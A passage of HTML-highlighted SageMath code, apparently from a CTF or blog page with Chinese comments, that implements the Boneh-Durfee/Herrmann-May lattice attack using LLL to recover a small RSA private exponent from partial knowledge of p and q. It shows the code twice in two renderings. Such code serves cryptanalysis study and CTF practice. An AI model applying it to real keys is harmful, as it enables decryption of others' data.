monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 "strict=true"，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #自动删除</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 重置维度</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查向量是否有帮助</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检查行列式是否正确界定</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"LLL is done!"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"在格中寻找线性无关向量"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 对于i and j, 构造两个多项式</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = </span><br><span class="line">        e = </span><br><span class="line">        c = </span><br><span class="line">        hint1 =   <span class="comment"># p高位</span></span><br><span class="line">        hint2 =   <span class="comment"># q高位</span></span><br><span class="line"><span class="comment">#         print ("p真实高",s,"比特：", int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print ("q真实高",s,"比特：", int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'\n\n\n l='</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print ("=== 核对数据 ===")</span></span><br><span class="line">                <span class="comment">#print ("* delta:", delta)</span></span><br><span class="line">                <span class="comment">#print ("* delta &lt; 0.292", delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print ("* size of e:", ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print ("* size of N:", len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print ("* size of N:", ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print ("* m:", m, ", t:", t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print ("=== running algorithm ===")</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print ("=== solution found ===")</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">"x:"</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">"y:"</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"=== solution found ==="</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"p的高比特为："</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"q的高比特为："</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">"d="</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"ss="</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Running time: %s Seconds'</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br>time.clock = time.time<br> <br>debug = <span class="hljs-literal">True</span><br> <br>strict = <span class="hljs-literal">False</span><br> <br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <span class="hljs-comment"># 如果晶格达到该尺寸，则停止移除</span><br><span class="hljs-comment"># 显示有用矢量的统计数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):<br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii,ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span> (nothelpful, <span class="hljs-string">"/"</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">" vectors are not helpful"</span>)<br><br><span class="hljs-comment"># 显示带有 0 和 X 的矩阵</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">'%02d '</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">'0'</span> <span class="hljs-keyword">if</span> BB[ii,jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'X'</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>: <br>                a += <span class="hljs-string">' '</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">'~'</span><br>        <span class="hljs-comment">#print (a)</span><br><br><span class="hljs-comment"># 尝试删除无用的向量</span><br><span class="hljs-comment"># 从当前 = n-1（最后一个向量）开始</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):<br>    <span class="hljs-comment"># 我们从当前 = n-1（最后一个向量）开始</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br> <br>    <span class="hljs-comment"># 开始从后面检查</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#  如果它没有用</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>             <span class="hljs-comment"># 让我们检查它是否影响其他向量</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># 如果另一个向量受到影响：</span><br>                <span class="hljs-comment"># 我们增加计数</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br> <br>            <span class="hljs-comment"># 等级：0</span><br>            <span class="hljs-comment"># 如果没有其他载体最终受到影响</span><br>            <span class="hljs-comment"># 我们删除它</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment">#print ("* removing unhelpful vector", ii)</span><br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br> <br>           <span class="hljs-comment"># 等级：1</span><br>            <span class="hljs-comment">#如果只有一个受到影响，我们会检查</span><br>            <span class="hljs-comment"># 如果它正在影响别的向量</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># 如果它影响哪怕一个向量</span><br>                    <span class="hljs-comment"># 我们放弃这个</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># 如果没有其他向量受到影响，则将其删除，并且</span><br>                <span class="hljs-comment"># 这个有用的向量不够有用</span><br>                <span class="hljs-comment">#与我们无用的相比</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(bound - BB[ii, ii]):<br>                    <span class="hljs-comment">#print ("* removing unhelpful vectors", ii, "and", affected_vector_index)</span><br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br> <br><span class="hljs-string">""" </span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1，-1 如果 "strict=true"，并且行列式不受约束</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">"""</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):<br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> 在以下情况下找到解决方案：</span><br><span class="hljs-string">* d &lt; N^delta</span><br><span class="hljs-string">* |x|&lt; e^delta</span><br><span class="hljs-string">* |y|&lt; e^0.5</span><br><span class="hljs-string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span><br><span class="hljs-string">    """</span><br> <br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="hljs-comment">#多项式环</span><br>    Q = PR.quotient(x*y + <span class="hljs-number">1</span> - u)        <span class="hljs-comment">#  u = xy + 1</span><br>    polZ = Q(pol).lift()<br> <br>    UU = XX*YY + <span class="hljs-number">1</span><br> <br>    <span class="hljs-comment"># x-移位</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk<br>            gg.append(xshift)<br>    gg.sort()<br> <br>    <span class="hljs-comment"># 单项式 x 移位列表</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials(): <span class="hljs-comment">#对于多项式中的单项式。单项式（）：</span><br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:  <span class="hljs-comment"># 如果单项不在单项中</span><br>                monomials.append(monomial)<br>    monomials.sort()<br> <br>    <span class="hljs-comment"># y-移位</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift) <span class="hljs-comment"># substitution</span><br> <br>    <span class="hljs-comment"># 单项式 y 移位列表</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u^kk * y^jj)<br> <br>    <span class="hljs-comment"># 构造格 B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)<br> <br>    <span class="hljs-comment">#约化格的原型</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment">#  #自动删除</span><br>        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># 重置维度</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">"failure"</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br> <br>    <span class="hljs-comment"># 检查向量是否有帮助</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus^mm)<br> <br>    <span class="hljs-comment"># 检查行列式是否正确界定</span><br>    det = BB.det()<br>    bound = modulus^(mm*nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"We do not have det &lt; bound. Solutions might not be found."</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"Try with highers m and t."</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">"size det(L) - size e^(m*n) = "</span>, floor(diff))<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)<br> <br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus^mm)<br> <br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)<br> <br>    <span class="hljs-comment">#BB = BB.BKZ(block_size=25)</span><br>    BB = BB.LLL()<br> <br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"LLL is done!"</span>)<br> <br>    <span class="hljs-comment"># 替换向量 i 和 j -&gt;多项式 1 和 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"在格中寻找线性无关向量"</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br> <br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br> <br>            <span class="hljs-comment"># 对于i and j, 构造两个多项式</span><br> <br>            PR.&lt;w,z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)<br>                pol2 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol2_idx, 